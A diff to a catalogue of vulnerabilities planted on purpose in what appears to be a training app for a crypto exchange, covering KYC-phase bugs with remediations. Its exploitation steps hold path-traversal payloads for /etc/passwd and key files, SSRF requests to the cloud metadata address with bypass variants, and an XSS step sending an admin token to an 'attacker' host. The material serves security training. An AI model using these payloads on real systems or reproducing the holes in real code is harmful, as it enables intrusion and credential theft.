@@ -125,9 +125,59 @@ Each entry:
 
 ---
 
+---
+
+## Phase 2 — KYC & identity
+
+### V-14: Path traversal in KYC document download
+
+- **Category:** OWASP / Path traversal
+- **Phase introduced:** 2
+- **Location:** `apps/web/app/api/v2/me/kyc/doc/route.ts` (`const path = join(UPLOADS_DIR, file)` — no normalization)
+- **Exploitation path:** Authenticate as any user (KYC tier 0 is fine; `/api/v2/me/kyc/doc` is auth-gated but not tier-gated). Hit `GET /api/v2/me/kyc/doc?file=../../../etc/hostname`. The handler joins the user-controlled `file` to the uploads directory and `readFileSync` reads outside the intended root. Use `?file=../../../../../../etc/passwd` (or container equivalents like `../../package.json`, `../../keys/legacy-2022`) to grab arbitrary process-readable files.
+- **Intended discovery difficulty:** easy
+- **Realistic root cause:** Engineer wired up doc downloads via `?file=` for "easy testing" before swapping to a content-addressable URL. The `?file=` path stayed.
+- **Remediation:** Look up the document by ID in the DB; serve from `storedPath` and verify the resolved path is contained within `UPLOADS_DIR` via `path.resolve` + prefix check.
+- **Chain membership:** standalone (also leaks `apps/web/keys/legacy-2022` → V-19 / V-20 prep)
+
+### V-27: Lexicographic KYC tier comparison
+
+- **Category:** Auth / Business logic
+- **Phase introduced:** 2 (latent; bug is reachable but no Phase-2 caller triggers the wrong path)
+- **Location:** `apps/web/lib/kyc-tier.ts` (`requireTier` — `if (user.kycTier < min)` with `number | string` operands)
+- **Exploitation path:** When *any* caller passes a multi-digit tier label as a string (e.g. Phase 4's margin tier system using `"10"`), the JS lexicographic compare ranks `"3" < "10"` as `true` because character `'3' > '1'`. A tier-3 user is reported as below tier `"10"`, *or* a tier-1 user is reported as ≥ tier `"3"` depending on which side is the string. Trainee finds this by either auditing the function or by Phase-4-onwards seeing surprising allow/deny outcomes.
+- **Intended discovery difficulty:** medium
+- **Realistic root cause:** Function accepts `string | number` because some callers pass tier labels from URL/header params. Engineer assumed JS would coerce; it doesn't when both sides are strings.
+- **Remediation:** Coerce explicitly: `Number(user.kycTier) < Number(min)`. Better, type the function as `(tier: Tier, min: Tier) => void`.
+- **Chain membership:** standalone
+
+### V-40: SSRF in KYC URL-import (CHAIN D component)
+
+- **Category:** SSRF
+- **Phase introduced:** 2
+- **Location:** `apps/web/app/api/v2/me/kyc/import-url/route.ts` (`isLocalHost` guard — checks only `localhost` / `127.0.0.1` / `::1`)
+- **Exploitation path:** Authenticate as a tier-1+ user. POST `{ "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "type": "address_proof" }` to `/api/v2/me/kyc/import-url`. The guard whitelists the literal strings and rejects nothing else; `169.254.169.254` passes through, the server-side `fetch` hits the mock IMDS container, returns the IAM role name. Repeat with `/latest/meta-data/iam/security-credentials/bvbe-web-instance-role` to get the synthetic `AKIAIOSFODNN7EXAMPLE` credentials, which a later phase will accept against the mock S3 endpoint to complete CHAIN D. Variants: `0.0.0.0`, decimal-encoded IPs (e.g. `2130706433` for `127.0.0.1`), IPv6-mapped (`::ffff:7f00:1`), redirects to internal hosts (the handler follows redirects), and DNS rebinding to a name that resolves first to a public IP and then to `169.254.169.254`.
+- **Intended discovery difficulty:** medium
+- **Realistic root cause:** Engineer added a fast string-equal check thinking "nobody legitimately points us at localhost," missing the wider canonicalisation of "local."
+- **Remediation:** Validate via DNS resolution against an IP allowlist for known public CDNs, then `fetch` with `redirect: "error"` and re-verify the final IP. Better: don't accept user URLs at all; require pre-signed cloud-storage URLs with a known vendor host whitelist.
+- **Chain membership:** CHAIN D (component) — SSRF → IMDS → IAM creds → mock S3 (Phase 9)
+
+### V-41: Polyglot file upload → stored XSS in admin review
+
+- **Category:** OWASP / XSS / Upload
+- **Phase introduced:** 2
+- **Location:** `apps/web/app/api/v2/me/kyc/documents/route.ts` (mime detected from filename extension when client sends `application/octet-stream`) + `apps/web/app/api/v2/admin/kyc/[userId]/doc/[docId]/route.ts` (serves verbatim `Content-Type: ${doc.mimeType}`) + `apps/web/app/admin/kyc/[userId]/page.tsx` (renders an iframe per doc whose content is a same-origin Blob URL preserving `mimeType`)
+- **Exploitation path:** Sign up, upload a file named `address.html` (or any `.html` extension) for `type: address_proof`. The upload handler infers `mimeType: "text/html"` from the filename extension. Submit for KYC review. When an admin opens `/admin/kyc/<userId>`, the page authedFetches each doc, wraps in a `Blob` with the stored mime, sets a blob URL as the iframe `src`. The iframe renders as `text/html` in the same origin as the admin's session → script executes → reads `window.parent.localStorage["bvbe.access"]` → exfiltrates the admin JWT (e.g., `fetch("http://attacker/?t=" + token)`). Combined with V-35, also enables CHAIN B's persistence step (admin token in hand, plant a new admin user).
+- **Intended discovery difficulty:** medium
+- **Realistic root cause:** Mime-from-extension is a tutorial-grade upload mistake. Pairing it with serve-verbatim-mime in a same-origin admin tool is the realistic root cause.
+- **Remediation:** Whitelist mime types from a sniffed magic-number check; force `Content-Type: application/octet-stream` and `Content-Disposition: attachment` on the admin doc-fetch; render previews in a sandboxed iframe (`sandbox` attribute without `allow-scripts`) and from a separate origin (a `cdn-uploads.bvbe.local` subdomain).
+- **Chain membership:** standalone — but a building block for CHAIN B (admin JWT theft is one of two routes to becoming admin)
+
+---
+
 ## Killer chains — current state
 
 - **CHAIN A — Drain the hot wallet:** components landed = V-19 (forge admin JWT). Remaining: leaked secret + treasury endpoint + PSBT signing flaw (Phase 7-9).
-- **CHAIN B — Become admin and persist:** components landed = V-35 (middleware bypass) + admin user-creation endpoint (planted admin via mass assignment will be added in Phase 4 via V-7). Remaining: smuggling at nginx (Phase 9).
+- **CHAIN B — Become admin and persist:** components landed = V-35 (middleware bypass) + V-41 (admin JWT theft via polyglot). Remaining: smuggling at nginx (Phase 9).
 - **CHAIN C — Mass user takeover:** no components yet (price feed + self-trade Phase 4).
-- **CHAIN D — Exfiltrate full user DB + KYC:** no components yet (SSRF + IMDS in Phase 2/9).
+- **CHAIN D — Exfiltrate full user DB + KYC:** components landed = V-40 (SSRF → mock IMDS → IAM creds). Remaining: mock S3 bucket + DB backup access (Phase 9).
